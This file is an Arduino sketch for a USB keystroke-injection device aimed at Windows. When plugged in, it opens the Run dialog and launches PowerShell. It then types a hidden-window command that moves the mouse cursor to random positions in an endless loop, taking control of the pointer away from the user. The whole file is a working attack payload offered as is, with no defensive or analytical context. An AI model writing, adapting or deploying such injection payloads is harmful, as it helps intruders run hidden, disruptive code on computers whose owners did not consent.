#include <Keyboard.h> 

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("powershell -w h -c 'while($true)");

  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("'");
  Keyboard.releaseAll();
  
  Keyboard.print("Add-Type -a system.windows.forms;foreach($i in 1..9999)");

  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("'");
  Keyboard.releaseAll();
  
  Keyboard.print("$x=Get-Random -Min 10 -Max 1910;$y=Get-Random -Min 10 -Max 1070;");

  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("(");
  Keyboard.releaseAll();
  
  Keyboard.print("System.Windows.Forms.Cursor");

  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print(")");
  Keyboard.releaseAll();
  
  Keyboard.print("::Position = New-Object System.Drawing.Point($x,$y)");

  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.print("==");
  Keyboard.releaseAll();
  
  Keyboard.print("'");

  delay(50);

  typeKey(KEY_RETURN);

  
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
